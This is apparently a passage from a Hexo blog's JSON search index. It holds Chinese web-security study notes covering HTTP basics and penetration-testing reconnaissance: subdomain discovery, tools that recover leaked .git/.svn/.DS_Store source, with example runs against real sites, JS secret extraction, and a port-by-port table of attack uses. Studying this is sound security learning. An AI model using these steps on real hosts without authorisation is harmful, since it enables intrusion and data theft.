/new-url\n是\n\n\n302\n\nFound\n资源临时重定向，客户端保持原URL（不转移SEO权重）\nLocation: /temp-url\n否\n\n\n304\n\nNot Modified\n资源未修改，客户端使用缓存（需配合If-Modified-Since头）\nETag, Last-Modified\n是\n\n\n307\n\nTemporary Redirect\n临时重定向且要求HTTP方法不变（如POST请求仍为POST）\nLocation: /temp-redirect\n否\n\n\n308\n\nPermanent Redirect\n永久重定向且要求HTTP方法不变\nLocation: /new-path\n是\n\n\n400\n4xx (客户端错误)\nBad Request\n请求语法错误（如参数缺失、格式无效）\n-\n是\n\n\n401\n\nUnauthorized\n未提供有效身份凭证（需认证）\nWWW-Authenticate: Basic\n是\n\n\n403\n\nForbidden\n权限不足（如用户无权访问资源）\n-\n是\n\n\n404\n\nNot Found\n资源不存在（URL错误或已删除）\n-\n是\n\n\n408\n\nRequest Timeout\n服务器等待请求超时（客户端发送过慢）\n-\n否\n\n\n429\n\nToo Many Requests\n客户端请求频率超限（触发速率限制）\nRetry-After: 60\n否\n\n\n500\n5xx (服务器错误)\nInternal Server Error\n服务器内部错误（代码异常、配置问题）\n-\n否\n\n\n502\n\nBad Gateway\n网关服务器收到上游无效响应（如Nginx后端服务崩溃）\n-\n否\n\n\n503\n\nService Unavailable\n服务暂时不可用（过载或维护）\nRetry-After: 3600\n否\n\n\n504\n\nGateway Timeout\n网关等待上游响应超时（如数据库查询超时）\n\n\n\n\n关键特性说明\n1.幂等性\n\n幂等操作（如GET&#x2F;PUT&#x2F;DELETE）：多次重复请求效果相同，客户端可安全重试\n非幂等操作（如POST）：重复请求可能导致资源重复创建，需谨慎处理\n\n2.重定向类型对比\n\n\n\n特性\n301&#x2F;308\n302&#x2F;307\n\n\n\n持久性\n永久\n临时\n\n\nSEO影响\n转移权重\n保留原权重\n\n\n方法保持\n301可改方法 308禁止改方法\n302可改方法 307禁止改方法\n\n\n3.响应头**（Response Headers）**\n\n\n关键响应头\n作用\n\n\n\nContent-Type: text/html\n响应体类型（如application/json）\n\n\nSet-Cookie: sessionId=...\n向客户端写入Cookie（属性：HttpOnly、Secure、SameSite）\n\n\nCache-Control: max-age=3600\n缓存控制策略（如public、no-cache）\n\n\nLocation: /new-path\n重定向目标地址（配合3xx状态码）\n\n\n4.响应体**（Response Body）**\n内容形式：HTML、JSON、图片等服务器返回的实际数据\n长度标识：Content-Length或分块传输编码\n\n四、HTTP方法全集\n\n\n方法\n语义\n幂等性\n安全性\n应用场景\n\n\n\nGET\n获取资源\n是\n是\n页面加载、API数据查询\n\n\nPOST\n创建资源\n否\n否\n表单提交、文件上传\n\n\nPUT\n替换整个资源\n是\n否\n全量更新用户信息\n\n\nDELETE\n删除资源\n是\n否\n删除文章\n\n\nPATCH\n部分更新资源\n否\n否\n修改用户昵称\n\n\nHEAD\n获取资源元数据\n是\n是\n检查链接有效性\n\n\nOPTIONS\n查询服务器支持的方法\n是\n是\nCORS预检请求\n\n\nTRACE\n诊断连接路径\n是\n是\n网络调试\n\n\n五、HTTPS对数据包的影响\n加密层：在HTTP与TCP间插入TLS&#x2F;SSL协议（端口443），对原始HTTP报文加密传输\n报文变化：\n明文 → 二进制加密数据（握手阶段协商对称密钥）\n保留HTTP语义，但无法直接读取内容（需解密）\n\n\n\n六、协议演进1.HTTP&#x2F;1.1\n持久连接（Connection: keep-alive）\n分块传输（Transfer-Encoding: chunked）\n\n2.HTTP&#x2F;2\n二进制分帧：将报文拆分为帧（Frame），多路复用提升效率\n头部压缩：HPACK算法减少冗余\n\n3.HTTP&#x2F;3\n基于QUIC协议（UDP），解决队头阻塞\n\n七、补充\n\n\n\n信息打点一、Web应用1.Web单域名查询方法：\n\n备案信息\n企业产权\n注册域名\n反查解析\n\n2.Web子域名（1）DNS数据查询\n原理：通过解析域名的权威DNS记录（NS、MX、TXT、CNAME等），挖掘隐含的子域名信息。DNS协议响应中可能暴露管理后台、邮件服务器等关键子域。\n\n记录类型分析：\n\nNS记录：权威DNS服务器（如 ns1.example.com）\nMX记录：邮件服务器子域（如 mail.example.com）\nTXT记录：可能包含SPF策略或隐藏子域线索\n\n\n优缺点：\n\n✅ 直接获取权威数据，准确性高\n❌ 依赖DNS配置完整性，隐私保护域名信息可能缺失\n\n\n\n（2）证书查询\n原理：基于证书透明度（Certificate Transparency, CT）政策，CA机构公开所有SSL&#x2F;TLS证书信息，证书中常包含主域名关联的子域名\n技术流程：\n证书日志聚合平台（如crt.sh）抓取公开CT日志\n解析证书的Subject Alternative Name (SAN)字段，提取所有绑定域名\n关联同一组织证书，发现业务子域（如 api.example.com, dev.example.com）\n\n\n适用场景：\n发现HTTPS服务子域\n追踪证书更新历史中的废弃子域（如测试环境）\n\n\n\n（3）网络空间查询\n原理：通过扫描全网IP和开放端口，建立“IP-域名-服务”映射关系库，反向关联子域名\n数据关联技术：\nIP反查：同一IP可能绑定多个子域名（如CDN节点）\n服务指纹识别：根据HTTP响应头、页面特征匹配归属组织\nASN归属分析：通过IP段归属企业，推测未公开子域\n\n\n优势：覆盖范围广，可发现非标准DNS配置的资产\n\n（4）威胁情报查询\n原理：整合公开漏洞库、黑客论坛、恶意软件流量等数据源，提取攻击活动中暴露的子域名\n数据来源：\nVirusTotal：恶意文件通信域名、DNS历史记录\nAlienVault OTX：众包威胁数据中的资产线索\nPassiveDNS：历史DNS解析存档（如SecurityTrails）\n\n\n应用：\n发现钓鱼仿冒子域（如 login-example.com）\n定位C&amp;C服务器关联域名\n\n\n\n（5）枚举解析\n原理：通过字典轮询可能的子域名组合，向DNS服务器发起批量查询，筛选有效响应\n\n（6）对比与实战建议\n\n\n查询方式\n覆盖深度\n速度\n隐蔽性\n典型场景\n\n\n\nDNS数据\n★★☆\n★★★\n★★☆\n快速获取权威记录\n\n\n证书查询\n★★★\n★★★★\n★★★★\nHTTPS资产发现\n\n\n网络空间测绘\n★★★★\n★★☆\n★★★★\n全网资产关联分析\n\n\n威胁情报\n★★★☆\n★★★☆\n★★★★★\n对抗攻击溯源\n\n\n枚举解析\n★★★★★\n★☆\n★☆\n深度渗透测试（需授权）\n\n\n3.源码获取3.1.开源\n核心逻辑：开源项目具有普遍性和明显特征，可通过指纹识别快速定位框架类型，找到cms，进而下载源码。\n实战技巧：\n对识别出的CMS，访问其/admin/login等默认路径验证一致性；\n通过GitHub搜索特征字符串（如JS中的版权信息）定位源码仓库。\n\n\n\n3.2.闭源\n泄露的原因：\n\n1.从源码本身的特性入口\n2.从管理员不好的习惯入口\n3.从管理员不好的配置入口\n4.从管理员不好的意识入口\n5.从管理员资源信息搜集入口\n\n\n常见的Web源码泄露及其利用：\n\n\n（1）&#x3D;&#x3D;git 源码泄露&#x3D;&#x3D;\nGit是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。\n\n漏洞利用工具：GitHack\n\ngithub项目地址：https://github.com/lijiejie/GitHack\n\n用法示例：GitHack.py http://www.openssl.org/.git/ \n\n修复建议：删除.git目录或者修改中间件配置进行对.git隐藏文件夹的访问。\n\n\n（2）svn 源码泄露\nSVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn&#x2F;entries文件，获取到服务器源码。\n漏洞利用工具：Seay SVN漏洞利用工具\n修复建议：删除web目录中所有.svn隐藏文件夹，开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码。\n\n（3）hg  源码泄露\nMercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg。\n漏洞利用工具：dvcs-ripper\n用法示例：rip-hg.pl -v -u http://www.example.com/.hg/\n\n（4）cvs 泄露\nCVS是一个C&#x2F;S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS&#x2F;Root以及CVS&#x2F;Entries目录，直接就可以看到泄露的信息。\n\n漏洞利用工具：dvcs-ripper\n\ngithub项目地址：https://github.com/kost/dvcs-ripper.git\n\n运行示例：rip-cvs.pl -v -u http://www.example.com/CVS/\n\n\n（5）Bazaar&#x2F;bzr泄露\nbzr也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。\n\n运行示例：rip-bzr.pl -v -u http://www.example.com/.bzr/\n\n\n（6）&#x3D;&#x3D;网站备份压缩文件&#x3D;&#x3D;\n管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。\n常见的备份文件后缀：\n.rar\n.zip\n.tar.gz\n.bak\n.txt\n.old\n.temp\n\n\n测试工具用扫描的就行\n\n（7）WEB-INF&#x2F;web.xml 泄露\nWEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应的映射才能访问。\nWEB-INF主要包含以下文件或目录：\n\n12345WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)\n\n\n通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n\n（8）DS-Store文件泄露\n.DS_Store是Mac下Finder用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。\ngithub项目地址：https://github.com/lijiejie/ds_store_exp\n用法示例：ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n\n（9）SWP文件泄露\nswp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。\n漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。\n\n（10）&#x3D;&#x3D;GitHub源码泄露&#x3D;&#x3D;\nGitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。\n类似的代码托管平台还有很多，人才是最大的漏洞。\nGitHub深度搜索：\n语法组合：in:readme 公司名 + language:php 定位内部项目；\n特征提取：扫描JS&#x2F;CSS中的邮箱、API密钥，反查员工公开仓库。\n\n\n\n3.3.黑灰产业源码商城\n通过谷歌搜索博彩源码商城、约友程序批发的关键词，定位境外平台（如CodeCanyon擦边板块）\n\n4.JS 前端架构4.1.什么是 JS 渗透测试？\n在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞\nJS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的\n查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于\nJS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL\n地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。\n\n前提：Web 应用可以采用后端或前端语言开发\n\n后端语言：php java python .NET 浏览器端看不到真实的源代码\n前端语言：JavaScript(JS)和 JS 框架 浏览器端看到真实的源代码\n\n\n例子：\n\nzblog：核心功能采用 PHP 语言去传输接受\nvue.js：核心功能采用框架语法（JS）传输接受\n\n\n\n4.2. JS 泄漏的攻击面1.敏感信息硬编码\n\n凭证泄露：API密钥、数据库密码、云服务AK&#x2F;SK直接写在JS中（如阿里云OSS密钥），攻击者可直接调用云服务API篡改数据。\n用户隐私：姓名、手机号、身份证号未经脱敏渲染至前端（如某FM应用评论模块泄露用户邮箱）。\n测试数据残留：生产环境保留测试账号Token，导致未授权登录后台\n\n2.接口路径暴露\n\n后台管理路径：JS注释或配置中遗留调试接口（如/admin/console、/api/internal），暴露攻击入口。\n未授权API：前端路由配置泄露无需认证的API（如数据查询接口），可被爬虫批量利用。\n\n3.系统架构信息\n\n技术栈标识：JS引入文件路径（如/static/js/app.js）暴露框架类型（Vue&#x2F;React）\n版本控制痕迹：.map文件泄露源码映射，便于逆向分析。\n\n4.3.流行的 JS 框架\nVue NodeJS jQuery Angular 等\n\n4.4. JS 开发应用的判定\n插件 wappalyzer\n源程序代码简短\n引入多个 js 文件\n一般有&#x2F;static&#x2F;js&#x2F;app.js 等顺序的 js 文件\n一般 cookie 中有 connect.sid\n\n4.5. JS 信息提取技术方法1.手工提取\n\n浏览器进行抓包检查\n全局关键字\n\n123456789src=path=method:&quot;get&quot;http.get (&quot;method:&quot;post&quot;http.post (&quot;$.ajaxhttp://service.httpposthttp://service.httpget\n\n\n\n2.半自动提取\n\nBurp Suite插件：\n自带功能：Target-&gt;sitemap-&gt;Engagement tools-&gt;Find scripts (脚本查找敏感信息)\n官方插件：JS Miner、JS Link Finder\n第三方插件：HaE、Unexpected_information\n插件加载器：jython-standalone-2.7.2\n\n\n\n3.自动提取\n\n\n\n工具类型\n代表工具\n功能\n\n\n\nURL&#x2F;子域名提取\nJSFinder、&#x3D;&#x3D;URLFinder&#x3D;&#x3D;\n快速爬取JS中的接口路径和子域名\n\n\n敏感信息扫描\nHaE、&#x3D;&#x3D;FindSomething&#x3D;&#x3D;(浏览器插件)\n标记JS中的密钥、手机号、邮箱等敏感数据\n\n\nWebPack解析\n&#x3D;&#x3D;Packer-Fuzzer&#x3D;&#x3D;、jjjjjjs\n解构Webpack打包的JS文件，提取隐藏接口\n\n\nFUZZ测试\n&#x3D;&#x3D;ffuf&#x3D;&#x3D;\n用fuzz爆破更多JS，对提取的路径进行模糊测试，探测未授权访问\n\n\n4.6.高危漏洞案例1.后台路径泄露 → 云存储沦陷\n\n某网站JS文件泄露后台路径/admin/config-backup，攻击者访问后获取OSS的AK&#x2F;SK，最终控制云存储桶删改文件。\n\n2.身份凭证硬编码 → 管理员权限获取\n\n前端JS内嵌测试账号Token，攻击者替换登录包中的Token直接进入后台。\n\n3.用户数据无脱敏 → 批量隐私泄露\n\n某平台服务端返回用户身份证号、银行卡号至前端，通过源码查看可爬取全站用户隐私。\n\n5.端口扫描\n基础概念：在计算机网络通信中，端口是应用程序或服务用于监听传入连接或发送传出数据的逻辑端点。每个端口都由一个16位的数字标识，范围从0到65535\n\n端口的重要性：\n\n服务识别：特定端口通常与特定服务关联，例如，80端口用于HTTP服务，443端口用于HTTPS服务，22端口用于SSH服务。通过识别开放端口，我们可以推断目标系统可能提供的功能。\n安全评估：开放了不必要的端口或运行着已知漏洞的服务，都可能成为攻击者的入口。端口扫描是安全审计和渗透测试的第一步。\n网络故障排查：确定服务是否正常运行，可以通过检查其监听的端口状态来判断。\n\n\n端口分类：\n\n知名端口(Well-Known Ports)：0-1023，由IANA(Internet Assigned Numbers Authority)分配和控制，用于常见的网络服务，如HTTP(80),FTP(21),SSH(22)等。\n注册端口(Registered Ports)：1024-49151，可由用户或应用程序注册，用于特定的应用程序或服务。\n动态&#x2F;私有端口(Dynamic&#x2F;Private Ports)：49152-65535，通常由客户端程序随机选择，用于临时通信。\n\n\n端口扫描工具：Nmap（综合）、Masscan（快速）、网络空间（方便）\n\n\n\n\n\n端口\n协议\n服务\n渗透用途\n\n\n\n20,21\nTCP\nFTP\n匿名上传下载、爆破、嗅探、Windows 提权、远程执行（如 proftpd 1.3.5）、后门利用（如 vsftpd 2.3.4）\n\n\n22\nTCP\nSSH\n爆破、SSHv1 中间人攻击、隧道代理、内网转发、文件传输\n\n\n23\nTCP\nTelnet\n爆破、嗅探（常见于路由器&#x2F;交换机弱口令）\n\n\n25\nTCP\nSMTP\n邮件伪造、VRFY/EXPN 用户枚举（工具：smtp-user-enum）\n\n\n53\nTCP&#x2F;UDP\nDNS\n区域传送劫持、DNS 投毒、欺骗、DNS 隧道远控\n\n\n69\nTCP&#x2F;UDP\nTFTP\n下载重要配置文件（如网络设备配置）\n\n\n80-89, 443\nTCP\nWeb 服务\nWeb 漏洞利用（注入、XSS、框架漏洞）、控制台爆破（如 OWA, VPN, Webmail）\n\n\n110\nTCP\nPOP3\n爆破、嗅探\n\n\n111, 2049\nTCP\nNFS\n权限配置不当导致未授权访问\n\n\n137,139,445\nTCP\nSamba\n爆破、漏洞利用（MS08-067, MS17-010）、嗅探\n\n\n143\nTCP\nIMAP\n爆破5\n\n\n161\nUDP\nSNMP\n默认团体字符串爆破、内网信息搜集\n\n\n389\nTCP\nLDAP\n注入、匿名访问、弱口令\n\n\n512-514\nTCP\nLinux rexec\n爆破、rlogin 登录\n\n\n873\nTCP\nRsync\n匿名访问、文件上传\n\n\n1194\nTCP\nOpenVPN\n钓取 VPN 账号进入内网\n\n\n1352\nTCP\nLotus\n弱口令、信息泄漏\n\n\n1433\nTCP\nSQL Server\n注入、提权、sa 弱口令爆破\n\n\n1521\nTCP\nOracle\nTNS 协议爆破、注入、反弹 Shell\n\n\n1723\nTCP\nPPTP\n爆破、钓取 VPN 账号\n\n\n2181\nTCP\nZooKeeper\n未授权访问\n\n\n3306\nTCP\nMySQL\n注入、提权、弱口令爆破\n\n\n3389\nTCP\nRDP\nShift 后门（Windows Server 2003 以下）、爆破、MS12-020 漏洞\n\n\n3690\nTCP\nSVN\n源码泄露、未授权访问\n\n\n4848\nTCP\nGlassFish\n弱口令\n\n\n5432\nTCP\nPostgreSQL\n爆破、注入、弱口令\n\n\n5900-5902\nTCP\nVNC\n弱口令爆破\n\n\n5984\nTCP\nCouchDB\n未授权导致的任意指令执行\n\n\n6379\nTCP\nRedis\n未授权访问、弱口令爆破\n\n\n7001-7002\nTCP\nWebLogic\nJava 反序列化、弱口令\n\n\n8080-8089\nTCP\nJenkins&#x2F;JBoss\n反序列化、控制台弱口令\n\n\n9200,9300\nTCP\nElasticSearch\n远程代码执行（如 CVE-2015-1427）\n\n\n11211\nTCP\nMemcached\n未授权访问（可被用于 DDoS 放大攻击）\n\n\n27017-27018\nTCP\nMongoDB\n爆破、未授权访问\n\n\n50070,50030\nTCP\nHadoop\n默认端口未授权访问（如信息泄露）\n\n\n6.识别防火墙\nWAF：Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP&#x2F;HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。\n\nWAF分类：\n\n云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等\n硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品\n软件 WAF：宝塔，安全狗、D 盾等\n代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的\n\n\n识别方法：\n\n看图识别：拦截页面，identywaf 项目内置\n识别项目：wafw00f   https://github.com/EnableSecurity/wafw00f\n\n\n\n7.蜜罐\n概念：蜜罐是一种安全威胁的检测技术，其本质在于引诱个欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队的角度钻研蜜罐识别的方式方法\n\n识别：指纹识别，网络空间识别，常用端口，连续端口等。\n\n技术分类与特点：\n\n\n\n\n\n类型\n交互层级\n优势与局限\n\n\n\n低交互蜜罐\n模拟基础服务响应\n部署简单、低风险，但易被识别（如Honeyd）。\n\n\n高交互蜜罐\n运行完整OS&#x2F;应用\n捕获深度攻击数据，但维护成本高（如Nepenthes）。\n\n\n\n","slug":"网安知识点","date":"2025-07-15T08:00:00.000Z","categories_index":"技术分类与特点","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post1$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server1$ hexo server\n\nMore info: Server\nGenerate static files1$ hexo generate\n\nMore info: Generating\nDeploy to remote sites1$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2025-07-14T15:11:14.379Z","categories_index":"","tags_index":"","author_index":"归尘aliez"}]